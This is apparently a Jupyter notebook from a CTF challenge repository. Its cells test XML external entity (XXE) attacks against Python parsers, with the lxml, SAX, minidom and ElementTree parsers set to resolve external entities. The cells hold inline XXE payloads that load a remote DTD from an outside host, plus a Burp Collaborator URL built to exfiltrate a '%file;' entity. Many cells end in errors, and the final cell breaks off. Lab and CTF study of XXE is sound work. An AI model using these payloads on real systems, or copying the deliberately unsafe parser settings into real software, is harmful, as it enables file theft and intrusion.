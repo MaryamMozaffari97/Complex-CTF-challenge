{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 105,
   "id": "4b8d6e59-8203-4350-a01c-8113bb7158cf",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "from lxml import etree\n",
    "import requests\n",
    "# class CustomResolver(etree.Resolver):\n",
    "#     def resolve(self, url, pubid, context):\n",
    "#         # Fetch the content from the provided URL\n",
    "#         response = requests.get(url)\n",
    "#         if response.status_code == 200:\n",
    "#             content = response.text\n",
    "#             # Return the fetched content\n",
    "#             return self.resolve_string(content, context)\n",
    "#         else:\n",
    "#             # Handle errors or return an empty string if needed\n",
    "#             return self.resolve_string(\"\", context)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "id": "552dd09a-4f71-4339-bc4c-faae98aee02c",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "def parse_svg_file():\n",
    "    parser = etree.XMLParser(load_dtd=True, no_network=False, resolve_entities=True)\n",
    "    with open('evil.svg', 'rb') as svg_file:\n",
    "        tree = etree.parse(svg_file, parser)\n",
    "        root = tree.getroot()\n",
    "        print(etree.dump(root))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "id": "4d4970f6-fe2d-46ec-8ece-26f97c935aac",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "ename": "XMLSyntaxError",
     "evalue": "Detected an entity reference loop, line 2, column 91 (xxe.dtd, line 2)",
     "output_type": "error",
     "traceback": [
      "Traceback \u001b[0;36m(most recent call last)\u001b[0m:\n",
      "\u001b[0m  File \u001b[1;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/IPython/core/interactiveshell.py:3508\u001b[0m in \u001b[1;35mrun_code\u001b[0m\n    exec(code_obj, self.user_global_ns, self.user_ns)\u001b[0m\n",
      "\u001b[0m  Cell \u001b[1;32mIn[109], line 1\u001b[0m\n    parse_svg_file()\u001b[0m\n",
      "\u001b[0m  Cell \u001b[1;32mIn[108], line 4\u001b[0m in \u001b[1;35mparse_svg_file\u001b[0m\n    tree = etree.parse(svg_file, parser)\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/etree.pyx:3541\u001b[0m in \u001b[1;35mlxml.etree.parse\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:1900\u001b[0m in \u001b[1;35mlxml.etree._parseDocument\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:1920\u001b[0m in \u001b[1;35mlxml.etree._parseFilelikeDocument\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:1814\u001b[0m in \u001b[1;35mlxml.etree._parseDocFromFilelike\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:1204\u001b[0m in \u001b[1;35mlxml.etree._BaseParser._parseDocFromFilelike\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:618\u001b[0m in \u001b[1;35mlxml.etree._ParserContext._handleParseResultDoc\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:728\u001b[0m in \u001b[1;35mlxml.etree._handleParseResult\u001b[0m\n",
      "\u001b[0;36m  File \u001b[0;32msrc/lxml/parser.pxi:657\u001b[0;36m in \u001b[0;35mlxml.etree._raiseParseError\u001b[0;36m\n",
      "\u001b[0;36m  File \u001b[0;32mhttp://192.168.30.102:9090/xxe.dtd:2\u001b[0;36m\u001b[0m\n\u001b[0;31mXMLSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m Detected an entity reference loop, line 2, column 91\n"
     ]
    }
   ],
   "source": [
    "parse_svg_file()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "8f1f7539-b222-4562-954e-da51b4ae1aaa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://im81nr4zhac2lafxnm997qwk6bc20r.burpcollaborator.net/?x=&#x25;file;\n"
     ]
    }
   ],
   "source": [
    "import urllib.parse\n",
    "from lxml import etree\n",
    "\n",
    "url = \"http://im81nr4zhac2lafxnm997qwk6bc20r.burpcollaborator.net/?x=&#x25;file;\"\n",
    "url_encoded = url.replace(\"%file\", urllib.parse.quote(\"%file\"))\n",
    "\n",
    "# Now you can use the url_encoded variable in your lxml code\n",
    "print(url_encoded)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "id": "5bc996e3-20ed-407e-b325-08c3a8933119",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "ename": "SAXParseException",
     "evalue": "http://192.168.30.102:9090/xxe.dtd:2:16: error in processing external entity reference",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mExpatError\u001b[0m                                Traceback (most recent call last)",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/sax/expatreader.py:217\u001b[0m, in \u001b[0;36mExpatParser.feed\u001b[0;34m(self, data, isFinal)\u001b[0m\n\u001b[1;32m    212\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[1;32m    213\u001b[0m     \u001b[38;5;66;03m# The isFinal parameter is internal to the expat reader.\u001b[39;00m\n\u001b[1;32m    214\u001b[0m     \u001b[38;5;66;03m# If it is set to true, expat will check validity of the entire\u001b[39;00m\n\u001b[1;32m    215\u001b[0m     \u001b[38;5;66;03m# document. When feeding chunks, they are not normally final -\u001b[39;00m\n\u001b[1;32m    216\u001b[0m     \u001b[38;5;66;03m# except when invoked from close.\u001b[39;00m\n\u001b[0;32m--> 217\u001b[0m     \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_parser\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mParse\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdata\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43misFinal\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    218\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m expat\u001b[38;5;241m.\u001b[39merror \u001b[38;5;28;01mas\u001b[39;00m e:\n",
      "\u001b[0;31mExpatError\u001b[0m: error in processing external entity reference: line 4, column 2",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mSAXParseException\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[78], line 21\u001b[0m\n\u001b[1;32m     18\u001b[0m     parser\u001b[38;5;241m.\u001b[39msetContentHandler(VulnerableContentHandler())\n\u001b[1;32m     19\u001b[0m     parser\u001b[38;5;241m.\u001b[39mparse(xml_file)\n\u001b[0;32m---> 21\u001b[0m \u001b[43mvulnerable_parse_xml_file\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[38;5;124;43mevil.svg\u001b[39;49m\u001b[38;5;124;43m\"\u001b[39;49m\u001b[43m)\u001b[49m\n",
      "Cell \u001b[0;32mIn[78], line 19\u001b[0m, in \u001b[0;36mvulnerable_parse_xml_file\u001b[0;34m(xml_file)\u001b[0m\n\u001b[1;32m     17\u001b[0m parser\u001b[38;5;241m.\u001b[39msetFeature(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mhttp://xml.org/sax/features/external-general-entities\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;28;01mTrue\u001b[39;00m)\n\u001b[1;32m     18\u001b[0m parser\u001b[38;5;241m.\u001b[39msetContentHandler(VulnerableContentHandler())\n\u001b[0;32m---> 19\u001b[0m \u001b[43mparser\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mparse\u001b[49m\u001b[43m(\u001b[49m\u001b[43mxml_file\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/sax/expatreader.py:111\u001b[0m, in \u001b[0;36mExpatParser.parse\u001b[0;34m(self, source)\u001b[0m\n\u001b[1;32m    109\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mreset()\n\u001b[1;32m    110\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_cont_handler\u001b[38;5;241m.\u001b[39msetDocumentLocator(ExpatLocator(\u001b[38;5;28mself\u001b[39m))\n\u001b[0;32m--> 111\u001b[0m     \u001b[43mxmlreader\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mIncrementalParser\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mparse\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43msource\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    112\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m:\n\u001b[1;32m    113\u001b[0m     \u001b[38;5;66;03m# bpo-30264: Close the source on error to not leak resources:\u001b[39;00m\n\u001b[1;32m    114\u001b[0m     \u001b[38;5;66;03m# xml.sax.parse() doesn't give access to the underlying parser\u001b[39;00m\n\u001b[1;32m    115\u001b[0m     \u001b[38;5;66;03m# to the caller\u001b[39;00m\n\u001b[1;32m    116\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_close_source()\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/sax/xmlreader.py:125\u001b[0m, in \u001b[0;36mIncrementalParser.parse\u001b[0;34m(self, source)\u001b[0m\n\u001b[1;32m    123\u001b[0m buffer \u001b[38;5;241m=\u001b[39m file\u001b[38;5;241m.\u001b[39mread(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_bufsize)\n\u001b[1;32m    124\u001b[0m \u001b[38;5;28;01mwhile\u001b[39;00m buffer:\n\u001b[0;32m--> 125\u001b[0m     \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mfeed\u001b[49m\u001b[43m(\u001b[49m\u001b[43mbuffer\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    126\u001b[0m     buffer \u001b[38;5;241m=\u001b[39m file\u001b[38;5;241m.\u001b[39mread(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_bufsize)\n\u001b[1;32m    127\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mclose()\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/sax/expatreader.py:221\u001b[0m, in \u001b[0;36mExpatParser.feed\u001b[0;34m(self, data, isFinal)\u001b[0m\n\u001b[1;32m    219\u001b[0m exc \u001b[38;5;241m=\u001b[39m SAXParseException(expat\u001b[38;5;241m.\u001b[39mErrorString(e\u001b[38;5;241m.\u001b[39mcode), e, \u001b[38;5;28mself\u001b[39m)\n\u001b[1;32m    220\u001b[0m \u001b[38;5;66;03m# FIXME: when to invoke error()?\u001b[39;00m\n\u001b[0;32m--> 221\u001b[0m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_err_handler\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mfatalError\u001b[49m\u001b[43m(\u001b[49m\u001b[43mexc\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/sax/handler.py:38\u001b[0m, in \u001b[0;36mErrorHandler.fatalError\u001b[0;34m(self, exception)\u001b[0m\n\u001b[1;32m     36\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mfatalError\u001b[39m(\u001b[38;5;28mself\u001b[39m, exception):\n\u001b[1;32m     37\u001b[0m     \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mHandle a non-recoverable error.\u001b[39m\u001b[38;5;124m\"\u001b[39m\n\u001b[0;32m---> 38\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m exception\n",
      "\u001b[0;31mSAXParseException\u001b[0m: http://192.168.30.102:9090/xxe.dtd:2:16: error in processing external entity reference"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "from xml.sax import make_parser\n",
    "from xml.sax.handler import ContentHandler\n",
    "\n",
    "class VulnerableContentHandler(ContentHandler):\n",
    "    def startElement(self, name, attrs):\n",
    "        print(\"startElement:\", name)\n",
    "\n",
    "    def endElement(self, name):\n",
    "        print(\"endElement:\", name)\n",
    "\n",
    "    def characters(self, content):\n",
    "        print(\"characters:\", content)\n",
    "\n",
    "def vulnerable_parse_xml_file(xml_file):\n",
    "    parser = make_parser()\n",
    "    parser.setFeature(\"http://xml.org/sax/features/external-general-entities\", True)\n",
    "    parser.setContentHandler(VulnerableContentHandler())\n",
    "    parser.parse(xml_file)\n",
    "\n",
    "vulnerable_parse_xml_file(\"evil.svg\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "id": "f3aa3722-7b01-441a-8b4f-f5db56416cec",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import io\n",
    "from xml.sax import make_parser\n",
    "from xml.dom import minidom\n",
    "from xml.sax.xmlreader import InputSource\n",
    "\n",
    "def parse_svg_file():\n",
    "    class CustomEntityResolver:\n",
    "        def resolveEntity(self, publicId, systemId):\n",
    "            return systemId  # Resolve external entities by returning their system ID.\n",
    "\n",
    "    with open('evil.svg', 'rb') as svg_file:\n",
    "        parser = make_parser()\n",
    "        parser.setEntityResolver(CustomEntityResolver())\n",
    "\n",
    "        input_source = InputSource()\n",
    "        input_source.setByteStream(svg_file)\n",
    "        dom = minidom.parse(input_source, parser=parser)\n",
    "\n",
    "        root = dom.documentElement\n",
    "        print(root.toprettyxml())\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "id": "f1b9a1a4-8ebb-4a4d-b663-d3f27f8a3905",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'InputSource' object has no attribute 'read'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[117], line 1\u001b[0m\n\u001b[0;32m----> 1\u001b[0m \u001b[43mparse_svg_file\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n",
      "Cell \u001b[0;32mIn[116], line 17\u001b[0m, in \u001b[0;36mparse_svg_file\u001b[0;34m()\u001b[0m\n\u001b[1;32m     15\u001b[0m input_source \u001b[38;5;241m=\u001b[39m InputSource()\n\u001b[1;32m     16\u001b[0m input_source\u001b[38;5;241m.\u001b[39msetByteStream(svg_file)\n\u001b[0;32m---> 17\u001b[0m dom \u001b[38;5;241m=\u001b[39m \u001b[43mminidom\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mparse\u001b[49m\u001b[43m(\u001b[49m\u001b[43minput_source\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mparser\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mparser\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m     19\u001b[0m root \u001b[38;5;241m=\u001b[39m dom\u001b[38;5;241m.\u001b[39mdocumentElement\n\u001b[1;32m     20\u001b[0m \u001b[38;5;28mprint\u001b[39m(root\u001b[38;5;241m.\u001b[39mtoprettyxml())\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/dom/minidom.py:1991\u001b[0m, in \u001b[0;36mparse\u001b[0;34m(file, parser, bufsize)\u001b[0m\n\u001b[1;32m   1989\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[1;32m   1990\u001b[0m     \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01mxml\u001b[39;00m\u001b[38;5;21;01m.\u001b[39;00m\u001b[38;5;21;01mdom\u001b[39;00m \u001b[38;5;28;01mimport\u001b[39;00m pulldom\n\u001b[0;32m-> 1991\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43m_do_pulldom_parse\u001b[49m\u001b[43m(\u001b[49m\u001b[43mpulldom\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mparse\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m(\u001b[49m\u001b[43mfile\u001b[49m\u001b[43m,\u001b[49m\u001b[43m)\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m   1992\u001b[0m \u001b[43m        \u001b[49m\u001b[43m{\u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mparser\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m:\u001b[49m\u001b[43m \u001b[49m\u001b[43mparser\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mbufsize\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m:\u001b[49m\u001b[43m \u001b[49m\u001b[43mbufsize\u001b[49m\u001b[43m}\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/dom/minidom.py:1979\u001b[0m, in \u001b[0;36m_do_pulldom_parse\u001b[0;34m(func, args, kwargs)\u001b[0m\n\u001b[1;32m   1977\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21m_do_pulldom_parse\u001b[39m(func, args, kwargs):\n\u001b[1;32m   1978\u001b[0m     events \u001b[38;5;241m=\u001b[39m func(\u001b[38;5;241m*\u001b[39margs, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs)\n\u001b[0;32m-> 1979\u001b[0m     toktype, rootNode \u001b[38;5;241m=\u001b[39m \u001b[43mevents\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mgetEvent\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m   1980\u001b[0m     events\u001b[38;5;241m.\u001b[39mexpandNode(rootNode)\n\u001b[1;32m   1981\u001b[0m     events\u001b[38;5;241m.\u001b[39mclear()\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/dom/pulldom.py:262\u001b[0m, in \u001b[0;36mDOMEventStream.getEvent\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    260\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mpulldom\u001b[38;5;241m.\u001b[39mlastEvent \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mpulldom\u001b[38;5;241m.\u001b[39mfirstEvent\n\u001b[1;32m    261\u001b[0m \u001b[38;5;28;01mwhile\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mpulldom\u001b[38;5;241m.\u001b[39mfirstEvent[\u001b[38;5;241m1\u001b[39m]:\n\u001b[0;32m--> 262\u001b[0m     buf \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mstream\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mread\u001b[49m(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mbufsize)\n\u001b[1;32m    263\u001b[0m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m buf:\n\u001b[1;32m    264\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mparser\u001b[38;5;241m.\u001b[39mclose()\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'InputSource' object has no attribute 'read'"
     ]
    }
   ],
   "source": [
    "parse_svg_file()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "id": "a0fb7f0b-2bf9-446a-bc09-3742e599b956",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "module 'xml.etree.ElementTree' has no attribute 'DefusedXML'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[120], line 16\u001b[0m\n\u001b[1;32m     13\u001b[0m xml_file \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124msample.xml\u001b[39m\u001b[38;5;124m\"\u001b[39m\n\u001b[1;32m     15\u001b[0m \u001b[38;5;66;03m# Parse the XML file using the custom resolver function\u001b[39;00m\n\u001b[0;32m---> 16\u001b[0m parser \u001b[38;5;241m=\u001b[39m \u001b[43mET\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mDefusedXML\u001b[49m\u001b[38;5;241m.\u001b[39mTreeBuilder(target\u001b[38;5;241m=\u001b[39mET\u001b[38;5;241m.\u001b[39mTreeBuilder())\n\u001b[1;32m     17\u001b[0m parser\u001b[38;5;241m.\u001b[39mparser\u001b[38;5;241m.\u001b[39mEntityResolver \u001b[38;5;241m=\u001b[39m resolve_dtd\n\u001b[1;32m     18\u001b[0m tree \u001b[38;5;241m=\u001b[39m ET\u001b[38;5;241m.\u001b[39mparse(xml_file, parser)\n",
      "\u001b[0;31mAttributeError\u001b[0m: module 'xml.etree.ElementTree' has no attribute 'DefusedXML'"
     ]
    }
   ],
   "source": [
    "import urllib.request\n",
    "import xml.etree.ElementTree as ET\n",
    "\n",
    "# Define the URL of the DTD file\n",
    "dtd_url = \"http://192.168.30.102:9090/xxe.dtd\"\n",
    "\n",
    "# Define a custom resolver function for loading the DTD file through network access\n",
    "def resolve_dtd(url):\n",
    "    dtd_data = urllib.request.urlopen(url).read()\n",
    "    return ET.XML(dtd_data)\n",
    "\n",
    "# Define the XML file to parse\n",
    "xml_file = \"sample.xml\"\n",
    "\n",
    "# Parse the XML file using the custom resolver function\n",
    "parser = ET.DefusedXML.TreeBuilder(target=ET.TreeBuilder())\n",
    "parser.parser.EntityResolver = resolve_dtd\n",
    "tree = ET.parse(xml_file, parser)\n",
    "\n",
    "# Access the root element of the XML document\n",
    "root = tree.getroot()\n",
    "\n",
    "# Do something with the parsed data..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 169,
   "id": "5bf9b8eb-1893-4a30-9bef-c060316aebfc",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "ename": "ParseError",
     "evalue": "undefined entity &xxe;: line 6, column 5 (<string>)",
     "output_type": "error",
     "traceback": [
      "Traceback \u001b[0;36m(most recent call last)\u001b[0m:\n",
      "\u001b[0m  File \u001b[1;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/IPython/core/interactiveshell.py:3508\u001b[0m in \u001b[1;35mrun_code\u001b[0m\n    exec(code_obj, self.user_global_ns, self.user_ns)\u001b[0m\n",
      "\u001b[0m  Cell \u001b[1;32mIn[169], line 30\u001b[0m\n    root = ET.fromstring(xml_content, parser=parser)\u001b[0m\n",
      "\u001b[0;36m  File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/xml/etree/ElementTree.py:1347\u001b[0;36m in \u001b[0;35mXML\u001b[0;36m\n\u001b[0;31m    parser.feed(text)\u001b[0;36m\n",
      "\u001b[0;36m  File \u001b[0;32m<string>\u001b[0;36m\u001b[0m\n\u001b[0;31mParseError\u001b[0m\u001b[0;31m:\u001b[0m undefined entity &xxe;: line 6, column 5\n"
     ]
    }
   ],
   "source": [
    "import xml.etree.ElementTree as ET\n",
    "import urllib.request\n",
    "\n",
    "# Define a custom resolver function to load DTD from network\n",
    "def dtd_resolver(url):\n",
    "    with urllib.request.urlopen(url) as response:\n",
    "        print(urllib.request.urlopen(url))\n",
    "        return response.read()\n",
    "\n",
    "# Define a custom parser class to handle external entity references\n",
    "class CustomXMLParser(ET.XMLParser):\n",
    "    def resolve_external_entity(self, public_id, system_id):\n",
    "        if system_id.startswith(\"http\"):\n",
    "            # Load DTD from network using the custom resolver\n",
    "            dtd_content = dtd_resolver(system_id)\n",
    "            return ET.XML(dtd_content)\n",
    "        else:\n",
    "            # Use default behavior for local DTD files\n",
    "            return super().resolve_external_entity(public_id, system_id)\n",
    "\n",
    "# Parse XML with external entity references and network-loaded DTD\n",
    "xml_content = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<!DOCTYPE foo [\n",
    "  <!ENTITY % remote SYSTEM \"http://192.168.30.102:9090/xxe.dtd\">\n",
    "  %remote;\n",
    "]>\n",
    "<foo>&xxe;</foo>\n",
    "'''\n",
    "parser = CustomXMLParser()\n",
    "root = ET.fromstring(xml_content, parser=parser)\n",
    "\n",
    "# Print the parsed XML tree\n",
    "ET.dump(root)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "id": "023643e2-520b-45b2-a44c-6ffd80c36131",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "class CustomEntityResolver(xml.sax.handler.ContentHandler):\n",
    "    def resolveEntity(self, publicId, systemId):\n",
    "        print(systemid)\n",
    "        if systemId.startswith(\"http://\"):\n",
    "            response = requests.get(systemId)\n",
    "            if response.status_code == 200:\n",
    "                dtd_data = response.text\n",
    "                input_source = xml.sax.InputSource()\n",
    "                input_source.setSystemId(systemId)\n",
    "                input_source.setCharacterStream(io.StringIO(dtd_data))\n",
    "                return input_source\n",
    "        return None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "id": "dcbdfafa-2ede-40ec-ad26-4ee9272c2507",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "class CustomContentHandler(xml.sax.ContentHandler):\n",
    "    def startElement(self, name, attrs):\n",
    "        print(f\"Start element: {name}\")\n",
    "\n",
    "    def endElement(self, name):\n",
    "        print(f\"End element: {name}\")\n",
    "\n",
    "    def characters(self, content):\n",
    "        print(f\"Content: {content.strip()}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 144,
   "id": "66045103-5b67-4c17-9a57-f80ee12774e9",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Start element: foo\n",
      "End element: foo\n"
     ]
    }
   ],
   "source": [
    "xml_data = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<!DOCTYPE foo [\n",
    "  <!ENTITY % remote SYSTEM \"http://192.168.30.102:9090/xxne.dtd\">\n",
    "  %remote;\n",
    "]>\n",
    "<foo>&data;</foo>\n",
    "'''\n",
    "parser = xml.sax.make_parser()\n",
    "parser.setFeature(xml.sax.handler.feature_external_ges, True)\n",
    "parser.setEntityResolver(resolver)\n",
    "parser.setContentHandler(handler)\n",
    "xml.sax.parseString(xml_data, handler)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 168,
   "id": "f455d95f-d110-4fa4-84b0-3b7b77a590a8",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Start element: foo\n",
      "End element: foo\n"
     ]
    }
   ],
   "source": [
    "import xml.sax\n",
    "import xml.sax.handler\n",
    "import xml.sax.saxutils as saxutils\n",
    "import requests\n",
    "import io\n",
    "import urllib.parse as urlparse\n",
    "import urllib.request as urllib2\n",
    "\n",
    "def make_caching_prepare_input_source(old_prepare_input_source):\n",
    "    def caching_prepare_input_source(source, base=None):\n",
    "        if isinstance(source, xml.sax.xmlreader.InputSource):\n",
    "            return source\n",
    "\n",
    "        full_uri = urlparse.urljoin(base or \"\", source)\n",
    "\n",
    "        if not full_uri.startswith('http:'):\n",
    "            args = (source,) if base is None else (source, base)\n",
    "            return old_prepare_input_source(*args)\n",
    "\n",
    "        response = requests.get(full_uri)\n",
    "        if response.status_code == 200:\n",
    "            dtd_data = response.text\n",
    "            i = xml.sax.xmlreader.InputSource()\n",
    "            i.setSystemId(source)\n",
    "            i.setCharacterStream(io.StringIO(dtd_data))\n",
    "            return i\n",
    "\n",
    "    return caching_prepare_input_source\n",
    "\n",
    "saxutils.prepare_input_source = make_caching_prepare_input_source(saxutils.prepare_input_source)\n",
    "\n",
    "class CustomContentHandler(xml.sax.handler.ContentHandler):\n",
    "    def startElement(self, name, attrs):\n",
    "        print(f\"Start element: {name}\")\n",
    "\n",
    "    def endElement(self, name):\n",
    "        print(f\"End element: {name}\")\n",
    "\n",
    "    def characters(self, content):\n",
    "        print(f\"Content: {content.strip()}\")\n",
    "\n",
    "xml_data = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<!DOCTYPE foo [\n",
    "  <!ENTITY % remote SYSTEM \"http://192.168.30.102:9090/xxe.dtd\">\n",
    "  %remote;\n",
    "]>\n",
    "<foo>&data;</foo>\n",
    "'''\n",
    "\n",
    "handler = CustomContentHandler()\n",
    "\n",
    "# Create the parser and enable processing of external general entities\n",
    "parser = xml.sax.make_parser()\n",
    "parser.setFeature(xml.sax.handler.feature_external_ges, True)\n",
    "\n",
    "parser.setContentHandler(handler)\n",
    "xml.sax.parseString(xml_data, handler)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 212,
   "id": "397a8fb3-d72c-41ff-82d3-b823060735ec",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
